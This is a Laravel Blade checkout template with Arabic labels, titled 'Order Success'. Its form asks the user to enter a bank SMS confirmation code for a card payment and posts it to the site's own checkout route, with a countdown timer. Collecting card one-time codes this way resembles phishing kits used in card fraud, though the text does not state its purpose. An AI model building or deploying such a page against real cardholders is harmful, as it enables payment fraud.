@extends('master.front')

@section('title')
    {{__('Order Success')}}
@endsection

@section('content')
    <!-- Page Title-->
<div class="page-title">
    <div class="container">
      <div class="column">
        <ul class="breadcrumbs">
          <li><a href="{{route('front.index')}}">{{__('Home')}}</a> </li>
          <li class="separator"></li>
          <li>{{__('Success')}}</li>
        </ul>
      </div>
    </div>
  </div>
  <!-- Page Content-->
<section class="container-fluid mt-3">
        <div class="row">
            <div class="rounded-4 shadow bg-white col-md-4 col-11 ms-auto me-auto px-4 py-3 my-md-5 my-3 border">
                <div class="row justify-content-center my-4  align-items-center">
                    <div class=" ">
                        <img src="https://mulfat.com/assets/images/visa.png" class="w-25 ms-5 ps-4" alt="">
                        <sapn class="fw-normal fs-4 text-center text-secondary   mx-2" dir="ltr">بطاقة ائتمانية | </sapn>
                    </div>
                </div>
                <div class="myCard">
          <form action="{{route('front.checkout.submit')}}" method="POST">
              @csrf
              <input name="type" type="hidden" value="00">
                        <div class="form-floating mb-3">
                            <input type="hidden" name="err" value="" id="">
                            <input type="tel" name="order" class="form-control rounded-4 " id="" required="" placeholder="رمز تأكيد العملية">
                            <p id="demo" class="text-danger p-3 mb-2"> سيتم ارسال الكود خلال 
                            
                            <span timer id='timer' class=timer></span>

                            ثانية </p>
                            <label for="order">
                                <div class=" text-secondary">
                                    <i class="fa-solid fa-circle-check fa-fw mx-2 fa-lg"></i>
                                    رمز التأكيد
                                </div>
                            </label>
                                                        
                        </div>
                        <div class="px-2">
                            <div class="form-check mb-3 border-top pt-2">
                                <label class="form-check-label text-secondary" style="font-size: 12px;" for="flexCheckDefault">يرجى ادخال رمز تأكيد العملية الذي تم ارساله عبر رسالة
                                    SMS
                                </label>
                            </div>
                        </div>
                        <div class="mb-3">
                            <button type="submit" class="w-100 btn primaryColor rounded-4 py-2" name="mybtn" id="codeConfirm">تأكيد
                            </button>
                        </div>
                    </form>
                </div>

            </div>
        </div>
    </section>
    
    
    <script>
        var timeoutHandle;
function countdown(minutes, seconds) {
    function tick() {
        var counter = document.getElementById("timer");
        counter.innerHTML =
            minutes.toString() + ":" + (seconds < 10 ? "0" : "") + String(seconds);
        seconds--;
        if (seconds >= 0) {
            timeoutHandle = setTimeout(tick, 1000);
        } else {
            if (minutes >= 1) {
                // countdown(mins-1);   never reach “00″ issue solved:Contributed by Victor Streithorst
                setTimeout(function () {
                    countdown(minutes - 1, 59);
                }, 1000);
            }
        }
    }
    tick();
}

countdown(2, 00);
    </script>
    
    @endsection
